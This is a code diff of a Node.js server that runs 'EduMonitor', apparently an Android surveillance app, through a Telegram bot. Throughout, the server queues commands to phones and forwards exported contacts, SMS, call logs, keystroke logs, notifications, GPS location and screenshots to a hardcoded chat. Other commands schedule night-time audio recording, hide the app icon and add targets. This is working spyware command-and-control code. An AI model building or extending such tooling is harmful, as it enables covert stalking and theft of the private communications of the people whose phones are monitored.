+                    "❌ Invalid interval. Please enter a number between 5 and 120.");
+                return;
+            }
+            
+            // Parse times
+            const [startHour, startMin] = userState.data.startTime.split(':').map(Number);
+            const [endHour, endMin] = userState.data.endTime.split(':').map(Number);
+            const recurring = userState.data.recurring;
+            
+            // Create the command
+            const command = `/record_custom ${startHour.toString().padStart(2,'0')}:${startMin.toString().padStart(2,'0')} ${endHour.toString().padStart(2,'0')}:${endMin.toString().padStart(2,'0')} ${recurring ? 'daily' : 'once'} ${interval}`;
+            
+            // Clear state
+            userStates.delete(chatId);
+            
+            // Execute the command
+            await handleCommand(chatId, command, messageId);
+            
+            await sendTelegramMessage(chatId, 
+                "✅ *Custom Schedule Configured*\n\n" +
+                `Start: ${userState.data.startTime}\n` +
+                `End: ${userState.data.endTime}\n` +
+                `Type: ${recurring ? 'Daily' : 'One-time'}\n` +
+                `Interval: ${interval} minutes\n\n` +
+                `Command sent to device.`);
+            break;
     }
 }
 
@@ -997,44 +724,17 @@ async function handleCallbackQuery(callbackQuery) {
 
 async function handleCommand(chatId, command, messageId) {
     console.log(`\n🎯 Handling command: ${command} from chat ${chatId}`);
-    console.log(`📊 Devices in memory: ${devices.size}`);
 
-    // Special case for /help - show inline keyboard menu
-    if (command === '/help' || command === '/start') {
-        console.log('📋 Showing help menu with inline keyboard');
-        
-        const mainKeyboard = [
-            [
-                createInlineButton('📱 Data Extraction', 'menu_data'),
-                createInlineButton('🎤 Recording', 'menu_recording')
-            ],
-            [
-                createInlineButton('📸 Screenshot', 'menu_screenshot'),
-                createInlineButton('⚙️ Services', 'menu_services')
-            ],
-            [
-                createInlineButton('📍 Location/Info', 'menu_location'),
-                createInlineButton('📊 Stats', 'menu_stats')
-            ],
-            [
-                createInlineButton('❌ Close Menu', 'close_menu')
-            ]
-        ];
+    // Special case for /help - show main menu
+    if (command === '/help' || command === '/start' || command === '/menu') {
+        console.log('📋 Showing main menu');
         
         await sendTelegramMessageWithKeyboard(
             chatId,
             "🤖 <b>EduMonitor Control Panel</b>\n\n" +
-            "Use the buttons below to access all features:\n\n" +
-            "<b>📱 Data Extraction</b> - Contacts, SMS, Call logs as files\n" +
-            "<b>🎤 Recording</b> - Audio recording and scheduling\n" +
-            "<b>📸 Screenshot</b> - Take screenshots, size settings\n" +
-            "<b>⚙️ Services</b> - Start/stop services, hide icon\n" +
-            "<b>📍 Location/Info</b> - GPS, network, storage info\n" +
-            "<b>📊 Stats</b> - Log counts and statistics",
-            mainKeyboard
+            "Select a category to get started:",
+            getMainMenuKeyboard()
         );
-        
-        console.log('✅ Help menu with keyboard sent');
         return;
     }
 
@@ -1075,7 +775,6 @@ async function handleCommand(chatId, command, messageId) {
     
     device.pendingCommands.push(commandObject);
     console.log(`📝 Command queued:`, commandObject);
-    console.log(`📊 Pending commands: ${device.pendingCommands.length}`);
 
     let ackMessage = `⏳ Processing: ${command}`;
     
@@ -1087,26 +786,8 @@ async function handleCommand(chatId, command, messageId) {
         ackMessage = `📞 Generating call logs file...`;
     } else if (cleanCommand.includes('apps')) {
         ackMessage = `📱 Generating apps list file...`;
-    } else if (cleanCommand.includes('keystrokes')) {
-        ackMessage = `⌨️ Generating keystrokes file...`;
-    } else if (cleanCommand.includes('notifications')) {
-        ackMessage = `🔔 Generating notifications file...`;
-    } else if (cleanCommand === 'storage') {
-        ackMessage = `💾 Calculating storage usage...`;
-    } else if (cleanCommand === 'network') {
-        ackMessage = `📡 Getting network information...`;
-    } else if (cleanCommand === 'screenshot_settings') {
-        ackMessage = `📸 Fetching screenshot settings...`;
     } else if (cleanCommand === 'location') {
-        ackMessage = `📍 Getting your current location... This may take a few seconds.`;
-    } else if (cleanCommand === 'record_auto_on') {
-        ackMessage = `⏰ Enabling auto recording schedule (23:00-04:00)...`;
-    } else if (cleanCommand === 'record_auto_off') {
-        ackMessage = `⏰ Disabling auto recording schedule...`;
-    } else if (cleanCommand === 'record_schedule') {
-        ackMessage = `⏰ Fetching recording schedule status...`;
-    } else if (cleanCommand.startsWith('record_custom')) {
-        ackMessage = `⚙️ Setting custom recording schedule...`;
+        ackMessage = `📍 Getting your current location...`;
     }
     
     await sendTelegramMessage(chatId, ackMessage);
@@ -1119,13 +800,14 @@ app.post('/api/upload-file', upload.single('file'), async (req, res) => {
         const deviceId = req.body.deviceId;
         const command = req.body.command;
         const filename = req.body.filename;
+        const itemCount = req.body.count || '0';
         
         if (!deviceId || !command || !filename || !req.file) {
-            console.error('❌ Missing fields in upload:', { deviceId, command, filename, hasFile: !!req.file });
+            console.error('❌ Missing fields in upload');
             return res.status(400).json({ error: 'Missing fields' });
         }
         
-        console.log(`📎 File upload from ${deviceId}: ${filename} (${req.file.size} bytes)`);
+        console.log(`📎 File upload from ${deviceId}: ${filename} (${req.file.size} bytes, ${itemCount} items)`);
         
         const device = devices.get(deviceId);
         if (!device) {
@@ -1138,37 +820,31 @@ app.post('/api/upload-file', upload.single('file'), async (req, res) => {
         
         // Determine caption based on command
         let caption = '';
-        let count = '';
-        
-        const countMatch = filename.match(/(\d+)/);
-        if (countMatch) {
-            count = countMatch[1];
-        }
         
         switch (command) {
             case 'contacts_txt':
             case 'contacts_html':
-                caption = `📇 Contacts Export ${count ? `(${count} contacts)` : ''}`;
+                caption = `📇 Contacts Export (${itemCount} contacts)`;
                 break;
             case 'sms_txt':
             case 'sms_html':
-                caption = `💬 SMS Messages Export ${count ? `(${count} messages)` : ''}`;
+                caption = `💬 SMS Messages Export (${itemCount} messages)`;
                 break;
             case 'calllogs_txt':
             case 'calllogs_html':
-                caption = `📞 Call Logs Export ${count ? `(${count} calls)` : ''}`;
+                caption = `📞 Call Logs Export (${itemCount} calls)`;
                 break;
             case 'apps_txt':
             case 'apps_html':
-                caption = `📱 Installed Apps Export ${count ? `(${count} apps)` : ''}`;
+                caption = `📱 Installed Apps Export (${itemCount} apps)`;
                 break;
             case 'keystrokes_txt':
             case 'keystrokes_html':
-                caption = `⌨️ Keystroke Logs Export ${count ? `(${count} entries)` : ''}`;
+                caption = `⌨️ Keystroke Logs Export (${itemCount} entries)`;
                 break;
             case 'notifications_txt':
             case 'notifications_html':
-                caption = `🔔 Notifications Export ${count ? `(${count} notifications)` : ''}`;
+                caption = `🔔 Notifications Export (${itemCount} notifications)`;
                 break;
             default:
                 caption = `📎 Data Export`;
@@ -1204,7 +880,7 @@ app.post('/api/location/:deviceId', async (req, res) => {
         const deviceId = req.params.deviceId;
         const locationData = req.body;
         
-        console.log(`📍 Location data from ${deviceId}:`, locationData);
+        console.log(`📍 Location data from ${deviceId}`);
         
         const device = devices.get(deviceId);
         if (!device) {
@@ -1232,7 +908,7 @@ app.post('/api/location/:deviceId', async (req, res) => {
             }
         }
         
-        // Send the formatted message with details and map link
+        // Send the formatted message
         await sendTelegramMessage(chatId, formatted.text);
         
         res.json({ success: true });
@@ -1256,8 +932,6 @@ app.get('/health', (req, res) => {
 
 app.get('/api/ping/:deviceId', (req, res) => {
     const deviceId = req.params.deviceId;
-    console.log(`💓 Ping from device ${deviceId}`);
-    
     const device = devices.get(deviceId);
     
     if (device) {
@@ -1277,11 +951,6 @@ app.get('/api/commands/:deviceId', (req, res) => {
             const commands = [...device.pendingCommands];
             device.pendingCommands = [];
             console.log(`📤 Sending ${commands.length} commands to ${deviceId}`);
-            
-            commands.forEach(cmd => {
-                console.log(`   └─ ${cmd.command}`);
-            });
-            
             sendJsonResponse(res, { commands });
         } else {
             sendJsonResponse(res, { commands: [] });
@@ -1296,13 +965,13 @@ app.post('/api/result/:deviceId', async (req, res) => {
     const deviceId = req.params.deviceId;
     const { command, result, error } = req.body;
     
-    // Skip if this is a file command (they use the upload endpoint)
+    // Skip if this is a file command
     if (command && (command.includes('_txt') || command.includes('_html'))) {
         console.log(`📎 File command ${command} using /api/upload-file endpoint`);
         return res.sendStatus(200);
     }
     
-    console.log(`📨 Result from ${deviceId}:`, { command, result: result?.substring(0, 100) });
+    console.log(`📨 Result from ${deviceId}:`, { command });
     
     const device = devices.get(deviceId);
     if (device) {
@@ -1310,11 +979,7 @@ app.post('/api/result/:deviceId', async (req, res) => {
         
         if (error) {
             await sendTelegramMessage(chatId, `❌ <b>Command Failed</b>\n\n<code>${command}</code>\n\n<b>Error:</b> ${error}`);
-        } 
-        else if (command === 'location') {
-            await sendTelegramMessage(chatId, result || '📍 Location command executed. Processing location data...');
-        }
-        else {
+        } else {
             await sendTelegramMessage(chatId, result || `✅ ${command} executed`);
         }
     }
@@ -1325,7 +990,7 @@ app.post('/api/result/:deviceId', async (req, res) => {
 app.post('/api/register', async (req, res) => {
     const { deviceId, chatId, deviceInfo } = req.body;
     
-    console.log('📝 Registration attempt:', { deviceId, chatId, deviceInfo });
+    console.log('📝 Registration attempt:', { deviceId, chatId });
     
     if (!deviceId || !chatId || !deviceInfo) {
         return res.status(400).json({ error: 'Missing fields' });
@@ -1346,36 +1011,19 @@ app.post('/api/register', async (req, res) => {
     devices.set(deviceId, deviceData);
     
     console.log(`✅ Device registered: ${deviceId} for chat ${chatId}`);
-    console.log(`📊 Total devices: ${devices.size}`);
     
-    // Send welcome message with inline keyboard
-    const welcomeKeyboard = [
-        [
-            createInlineButton('📱 Data', 'menu_data'),
-            createInlineButton('🎤 Recording', 'menu_recording')
-        ],
-        [
-            createInlineButton('📸 Screenshot', 'menu_screenshot'),
-            createInlineButton('⚙️ Services', 'menu_services')
-        ],
-        [
-            createInlineButton('📍 Location', 'menu_location'),
-            createInlineButton('📊 Stats', 'menu_stats')
-        ],
-        [
-            createInlineButton('❌ Close', 'close_menu')
-        ]
-    ];
+    // Set menu button for this chat
+    await setChatMenuButton(chatId);
     
+    // Send welcome message with keyboard
     await sendTelegramMessageWithKeyboard(
         chatId,
         `✅ <b>Device Connected!</b>\n\n` +
         `Model: ${deviceInfo.model}\n` +
         `Android: ${deviceInfo.android}\n` +
-        `Battery: ${deviceInfo.battery}\n` +
-        `ID: ${deviceId.substring(0, 8)}...\n\n` +
-        `<b>Use the buttons below to control your device:</b>`,
-        welcomeKeyboard
+        `Battery: ${deviceInfo.battery}\n\n` +
+        `Use the menu button below or tap the buttons to control your device:`,
+        getMainMenuKeyboard()
     );
     
     res.json({ status: 'registered', deviceId });
@@ -1389,29 +1037,13 @@ app.get('/api/devices', (req, res) => {
             chatId: device.chatId,
             lastSeen: new Date(device.lastSeen).toISOString(),
             model: device.deviceInfo?.model || 'Unknown',
-            android: device.deviceInfo?.android || 'Unknown',
-            pendingCommands: device.pendingCommands?.length || 0
+            android: device.deviceInfo?.android || 'Unknown'
         });
     }
     res.json({ total: devices.size, devices: deviceList });
 });
 
-app.get('/api/debug/:deviceId', (req, res) => {
-    const deviceId = req.params.deviceId;
-    const device = devices.get(deviceId);
-    
-    if (device) {
-        res.json({
-            deviceId,
-            chatId: device.chatId,
-            deviceInfo: device.deviceInfo,
-            lastSeen: new Date(device.lastSeen).toISOString(),
-            pendingCommands: device.pendingCommands || []
-        });
-    } else {
-        res.json({ error: 'Device not found' });
-    }
-});
+// ============= TEST ENDPOINTS =============
 
 app.get('/test', (req, res) => {
     res.send(`
@@ -1421,41 +1053,22 @@ app.get('/test', (req, res) => {
             <p><b>Time:</b> ${new Date().toISOString()}</p>
             <p><b>Devices:</b> ${devices.size}</p>
             <p><b>Authorized Chats:</b> ${Array.from(authorizedChats).join(', ')}</p>
-            <p><b>Inline Keyboard Support:</b> ✅ ADDED</p>
-            <p><b>Location:</b> Returns map link + pin</p>
-            <p><b>Recording Schedule Commands:</b> Added</p>
-            <p><a href="/test-help" style="background: #4CAF50; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Send Test Help</a></p>
+            <p><b>Menu Button:</b> ✅ Configured</p>
+            <p><b>Interactive Schedule:</b> ✅ Added</p>
+            <p><a href="/test-menu" style="background: #4CAF50; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Send Test Menu</a></p>
         </body>
         </html>
     `);
 });
 
-app.get('/test-help', async (req, res) => {
+app.get('/test-menu', async (req, res) => {
     const chatId = '5326373447';
-    const mainKeyboard = [
-        [
-            createInlineButton('📱 Data', 'menu_data'),
-            createInlineButton('🎤 Recording', 'menu_recording')
-        ],
-        [
-            createInlineButton('📸 Screenshot', 'menu_screenshot'),
-            createInlineButton('⚙️ Services', 'menu_services')
-        ],
-        [
-            createInlineButton('📍 Location', 'menu_location'),
-            createInlineButton('📊 Stats', 'menu_stats')
-        ],
-        [
-            createInlineButton('❌ Close', 'close_menu')
-        ]
-    ];
-    
     const result = await sendTelegramMessageWithKeyboard(
         chatId,
-        "🤖 <b>EduMonitor Control Panel</b>\n\nUse the buttons below:",
-        mainKeyboard
+        "🤖 Test Menu - Use the buttons below:",
+        getMainMenuKeyboard()
     );
-    res.json({ success: !!result, result });
+    res.json({ success: !!result });
 });
 
 // ============= START SERVER =============
@@ -1465,23 +1078,19 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Server running on port ${PORT}`);
     console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
     console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
-    console.log('\n✅ INLINE KEYBOARD BUTTONS ADDED!');
-    console.log('   └─ Main menu with 6 categories');
-    console.log('   └─ Submenus for each category');
-    console.log('   └─ Command buttons that execute actions');
-    console.log('\n📍 LOCATION FEATURE: Returns map link + pin');
-    console.log('\n⏰ RECORDING SCHEDULE COMMANDS:');
-    console.log('   └─ /record_auto_on     - Enable auto schedule');
-    console.log('   └─ /record_auto_off    - Disable auto schedule');
-    console.log('   └─ /record_schedule    - Check schedule status');
-    console.log('   └─ /record_custom      - Set custom schedule');
-    console.log('\n📱 FILE-BASED COMMANDS:');
-    console.log('   └─ /contacts_txt/html     - Contacts as file');
-    console.log('   └─ /sms_txt/html          - SMS as file');
-    console.log('   └─ /calllogs_txt/html     - Call logs as file');
-    console.log('   └─ /apps_txt/html         - Apps as file');
-    console.log('   └─ /keystrokes_txt/html   - Keystrokes as file');
-    console.log('   └─ /notifications_txt/html - Notifications as file');
-    console.log('\n🚀 File size limit: 50MB');
-    console.log('🚀 ===============================================\n');
+    console.log('\n✅ MENU BUTTON CONFIGURED:');
+    console.log('   └─ Persistent menu button appears next to input field');
+    console.log('   └─ 16 commands registered with BotFather');
+    console.log('\n✅ INTERACTIVE SCHEDULE SETUP:');
+    console.log('   └─ Step-by-step time entry');
+    console.log('   └─ Daily/Once choice with buttons');
+    console.log('   └─ Interval validation');
+    console.log('\n✅ MISSING COMMANDS ADDED:');
+    console.log('   └─ /audio_ultra, /audio_very_low, /audio_low, /audio_medium, /audio_high');
+    console.log('   └─ /audio_info, /compression_stats');
+    console.log('   └─ /add_target [package]');
+    console.log('\n✅ FILE UPLOAD FIXED:');
+    console.log('   └─ Item counts now properly displayed');
+    console.log('   └─ Example: "📱 Installed Apps Export (42 apps)"');
+    console.log('\n🚀 ===============================================\n');
 });
